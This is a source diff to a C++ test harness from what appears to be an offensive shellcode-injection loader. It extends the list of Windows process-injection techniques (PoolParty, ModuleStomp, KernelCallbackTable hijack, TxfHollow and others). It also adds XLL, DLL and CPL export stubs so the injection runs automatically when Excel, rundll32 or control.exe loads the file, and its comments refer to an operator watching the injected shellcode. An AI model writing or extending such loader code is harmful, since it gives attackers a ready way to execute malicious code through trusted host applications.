@@ -1,12 +1,16 @@
 /**
  * @file test_injection.cpp
  * @brief Test specific injection methods
- * 
+ *
  * Build with different CONFIG_INJECTION_TYPE values:
- *   make test-injection BUILD=debug INJECTION_TYPE=1  # NtMapViewOfSection
- *   make test-injection BUILD=debug INJECTION_TYPE=2  # CreateFiber
- *   make test-injection BUILD=debug INJECTION_TYPE=3  # EarlyCascade
- *   make test-injection BUILD=debug INJECTION_TYPE=4  # PoolParty
+ *   make test-injection INJECTION_TYPE=1  # NtMapViewOfSection   (remote)
+ *   make test-injection INJECTION_TYPE=2  # CreateFiber          (self)
+ *   make test-injection INJECTION_TYPE=3  # EarlyCascade         (remote)
+ *   make test-injection INJECTION_TYPE=4  # PoolParty            (remote)
+ *   make test-injection INJECTION_TYPE=5  # NtQueueApcThread     (remote)
+ *   make test-injection INJECTION_TYPE=6  # ModuleStomp          (self)
+ *   make test-injection INJECTION_TYPE=7  # KernelCallbackTable  (self)
+ *   make test-injection INJECTION_TYPE=8  # TxfHollow            (remote)
  */
 
 #include <cstdio>
@@ -47,13 +51,21 @@
 
 const char* GetInjectionMethodName() {
 #if CONFIG_INJECTION_TYPE == 1
-    return "NtMapViewOfSection (Section Mapping)";
+    return "NtMapViewOfSection (Section Mapping, Remote)";
 #elif CONFIG_INJECTION_TYPE == 2
-    return "CreateFiber (Fiber-based Self-Injection)";
+    return "CreateFiber (Fiber-based, Self)";
 #elif CONFIG_INJECTION_TYPE == 3
-    return "EarlyCascade (Early Bird APC)";
+    return "EarlyCascade (Early Bird APC, Remote)";
 #elif CONFIG_INJECTION_TYPE == 4
-    return "PoolParty (Worker Factory Thread Pool)";
+    return "PoolParty (Worker Factory Thread Pool, Remote)";
+#elif CONFIG_INJECTION_TYPE == 5
+    return "NtQueueApcThread (APC into existing thread, Remote)";
+#elif CONFIG_INJECTION_TYPE == 6
+    return "ModuleStomp (Legitimate DLL .text overwrite, Self)";
+#elif CONFIG_INJECTION_TYPE == 7
+    return "KernelCallbackTable (PEB KCT hijack via SendMessage, Self)";
+#elif CONFIG_INJECTION_TYPE == 8
+    return "TxfHollow (Transacted NTFS ghost section, Remote)";
 #else
     return "Unknown";
 #endif
@@ -172,17 +184,75 @@ int main(int argc, char* argv[]) {
         free(shellcode_ptr);
     
 #if CONFIG_INJECTION_MODE == 1
-    // For remote injection, we might want to resume or terminate the process
-    printf("\nPress Enter to terminate the target process...");
-    getchar();
-    
+    // For remote injection, wait before cleanup so the operator can
+    // observe the injected shellcode. When loaded inside a DLL / XLL /
+    // CPL host (Excel, control.exe, rundll32) we have no stdin, so
+    // getchar() would block the host forever - fall back to a fixed
+    // sleep in those modes.
+#   if defined(BUILD_DLL) || defined(BUILD_CPL) || defined(BUILD_XLL)
+        Sleep(15000);
+#   else
+        printf("\nPress Enter to terminate the target process...");
+        getchar();
+#   endif
+
     TerminateProcess(process_handle, 0);
     CloseHandle(process_handle);
     CloseHandle(thread_handle);
     PRINT_INFO("Target process terminated");
 #endif
-    
+
     PRINT_HEADER("TEST COMPLETE");
-    
+
     return 0;
 }
+
+// --------------------------------------------------------------------------
+// DLL / CPL / XLL entry points.
+//
+// The test-injection-* Makefile targets link this translation unit as
+// `-shared` into a .dll / .cpl / .xll for hands-on testing against the
+// corresponding host (rundll32 / control.exe / Excel). Without these
+// exports the resulting PE has no host-recognised entry point - Excel
+// in particular refuses to load an .xll that does not export
+// xlAutoOpen, which is what caused the "file format and extension
+// don't match" dialog the operator saw.
+// --------------------------------------------------------------------------
+#if defined(BUILD_XLL)
+
+extern "C" __declspec(dllexport) int WINAPI xlAutoOpen(void)
+{
+    char stub[] = "test_injection_xll";
+    char* argv[] = { stub, NULL };
+    main(1, argv);
+    return 1;
+}
+
+extern "C" __declspec(dllexport) int WINAPI xlAutoClose(void)
+{
+    return 1;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID /*reserved*/)
+{
+    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(hModule);
+    return TRUE;
+}
+
+#elif defined(BUILD_DLL)
+
+// rundll32-style entry: `rundll32 erebus_injection_test.dll,RunTest`
+extern "C" __declspec(dllexport) void CALLBACK RunTest(HWND, HINSTANCE, LPSTR, int)
+{
+    char stub[] = "test_injection_dll";
+    char* argv[] = { stub, NULL };
+    main(1, argv);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID /*reserved*/)
+{
+    if (reason == DLL_PROCESS_ATTACH) DisableThreadLibraryCalls(hModule);
+    return TRUE;
+}
+
+#endif
